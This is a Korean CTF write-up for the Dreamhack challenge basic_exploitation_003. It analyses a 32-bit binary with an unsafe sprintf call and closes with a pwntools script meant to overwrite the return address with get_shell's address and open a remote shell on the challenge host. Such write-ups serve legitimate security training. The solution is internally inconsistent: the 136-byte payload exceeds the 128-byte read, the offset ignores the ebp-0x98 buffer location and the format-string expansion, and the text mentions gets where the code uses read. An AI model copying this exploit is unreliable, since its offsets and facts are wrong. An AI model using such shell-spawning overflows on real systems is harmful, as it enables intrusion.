# 목차
1. 문제 설명

    1.1. Description

    1.2. Environment

2. 문제 파일 분석

    2.1. 코드 분석

    2.2. 실행 파일 분석

3. 문제 풀이 코드

## 1. 문제 설명

### 1.1. Description

이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_003)의 바이너리와 소스 코드가 주어집니다.

프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.

"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.

플래그의 형식은 DH{...} 입니다.

### 1.2. Environment

Ubuntu 16.04

Arch:     i386-32-little

RELRO:    Partial RELRO

Stack:    No canary found

NX:       NX enabled
- *NX보호기법이란?*
    - 명칭 : NX(No-eXecute) bit
    - 특징
        - 버퍼 오버플로우 보호 기법중 하나
        - 스택, 힙과 같은 영역에서 코드가 실행되는 것을 막는 보호기법
        - nx 보호기법이 적용되어 있다면, shellcode를 실행할 수 없음
    - NX bit 설정 확인 명령어 : dmesg | grep NX
    - 우회 방법
        - system함수를 호출하는 특정 함수의 주소로 ret를 변조

PIE:      No PIE (0x8048000)

## 2. 문제 파일 분석

### 2.1. 코드 분석

`cat basic_exploitation_003.c`를 통해 코드를 확인
```
// basic_exploitation_003.c //

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```
- 주요 기능
    - `main`함수가 실행
    - 힙 메모리에 `heap_buf`에 `0x80(128)byte`의 공간을 부여
    - 스택 메모리에 `stack_buf`에 `0x90(144)byte`의 공간을 부여
    - `read`함수를 통해 `heap_buf`을 입력 받음
    - `sprintf`함수를 통해 `heap_buf`을 `stack_buf`에 저장
    - `get_shell`함수가 실행되면 `/bin/sh`을 실행

- 주의
    - `sprintf`함수가 `heap_buf`의 내용을 그대로 사용
    -  메모리 내용이 유출되거나, 메모리 값을 임의로 변경 가능
    - `gets`함수의 버퍼를 다 채울 경우 `null`이 들어갈 수 없어 오류 발생

- 발생 가능한 취약점
    - **포맷 스트링 취약점 (Format String Vulnerability)**
    - **스택 오버플로우(Stack Buffer OverFlow)**

즉, `sprintf`함수를 통해 `stack_buf`를 오버플로우를 시켜 스택에 있는 복귀 주소가 저장되어있는 `ret`에 `get_shell`함수의 주소를 넣는 **ROP(Retrun Oriented Programming)**가 발생 가능

### 2.2. 실행 파일 분석

`gdb ./basic_exploitation_003`를 통해 GNU 디버거를 실행

`disass main`를 통해 `main`함수의 어셈블리 확인
```
   0x0804867c <+0>:     push   ebp                                                                                  
   0x0804867d <+1>:     mov    ebp,esp                                                                              
   0x0804867f <+3>:     push   edi                                                                                  
   0x08048680 <+4>:     sub    esp,0x94                                                                             
   0x08048686 <+10>:    push   0x80                                                                                 
   0x0804868b <+15>:    call   0x8048490 <malloc@plt>                                                               
   0x08048690 <+20>:    add    esp,0x4                                                                              
   0x08048693 <+23>:    mov    DWORD PTR [ebp-0x8],eax
   0x08048696 <+26>:    lea    edx,[ebp-0x98]
   0x0804869c <+32>:    mov    eax,0x0
   0x080486a1 <+37>:    mov    ecx,0x24
   0x080486a6 <+42>:    mov    edi,edx
   0x080486a8 <+44>:    rep stos DWORD PTR es:[edi],eax
   0x080486aa <+46>:    call   0x8048622 <initialize>
   0x080486af <+51>:    push   0x80
   0x080486b4 <+56>:    push   DWORD PTR [ebp-0x8]
   0x080486b7 <+59>:    push   0x0
   0x080486b9 <+61>:    call   0x8048450 <read@plt>
   0x080486be <+66>:    add    esp,0xc
   0x080486c1 <+69>:    push   DWORD PTR [ebp-0x8]
   0x080486c4 <+72>:    lea    eax,[ebp-0x98]
   0x080486ca <+78>:    push   eax
   0x080486cb <+79>:    call   0x80484f0 <sprintf@plt>
   0x080486d0 <+84>:    add    esp,0x8
   0x080486d3 <+87>:    lea    eax,[ebp-0x98]
   0x080486d9 <+93>:    push   eax
   0x080486da <+94>:    push   0x8048791
   0x080486df <+99>:    call   0x8048460 <printf@plt>
   0x080486e4 <+104>:   add    esp,0x8
   0x080486e7 <+107>:   mov    eax,0x0
   0x080486ec <+112>:   mov    edi,DWORD PTR [ebp-0x4]
   0x080486ef <+115>:   leave
   0x080486f0 <+116>:   ret
```
`0x08048686 <+10>:    push   0x80`: `0x80(128)byte`공간의 동적 메모리를 할당하기 위해 크기를 스택에 저장

`0x080486af <+51>:    push   0x80`: `read`함수가 읽는 버퍼의 크기

`0x080486b4 <+56>: push DWORD PTR [ebp-0x8]`: 스택에 `heap_buf`의 주소를 저장
- `DWORD PTR [ebp-0x8]`: `heap_buf`의 주소

`0x080486c4 <+72>:    lea    eax,[ebp-0x98]`: `eax`에 `stack_buf`의 주소를 저장
- `[ebp-0x98]`: `stack_buf`의 주소

`0x080486cb <+79>:    call   0x80484f0 <sprintf@plt>`: `heap_buf`의 내용을 `stack_buf`에 복사

스택에 쌓인 모습
```
높은 주소
+---------------+  <-- sprintf 함수 호출 후 복귀할 리턴 주소 (4 bytes)
|      ret      |
+---------------+
|      sfp      |  <-- Saved EBP (4 bytes, 이전 함수의 베이스 포인터)
|     4byte     |
+---------------+
| stack_buf주소 |  <-- sprintf 함수의 첫 번째 인수 [ebp-0x98]
|     4byte     |
+---------------+
| heap_buf 주소 |  <-- sprintf 함수의 두 번째 인수 [ebp-0x8]
|     4byte     |
+---------------+  <-- esp (스택 포인터, 현재 위치)
|      ...      |  <-- 이전 스택 데이터 (함수 호출 이전의 esp)
|  0xc(12)byte  |
+---------------+
낮은 주소

```


`"x/i get_shell" or "disass get_shell"`등을 입력

`0x8048669 <get_shell>:       push   ebp`

`ret`에 들어갈 `get_shell`함수의 주소 확인











## 3. 문제 풀이 코드

```
from pwn import *

payload = b'\x90'*128 + b'\x90'*4 + b'\x69\x86\x04\x08' #buf + sfp + get_shell()

r = remote('host3.dreamhack.games', 9774)

r.send(payload)

r.interactive()
```